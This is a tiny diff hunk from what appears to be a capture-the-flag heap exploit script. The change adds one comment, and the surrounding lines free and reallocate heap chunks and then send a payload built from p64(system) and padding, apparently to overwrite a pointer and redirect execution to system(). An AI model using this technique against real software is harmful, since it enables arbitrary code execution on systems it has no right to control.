@@ -63,6 +63,7 @@ delete(2)
 delete(3)
 debug()
 
+## animal4 == buf_3
 ## buf_4 == animal_2
 create(p64(system) + "a" * 8 + "\x50") #4
 
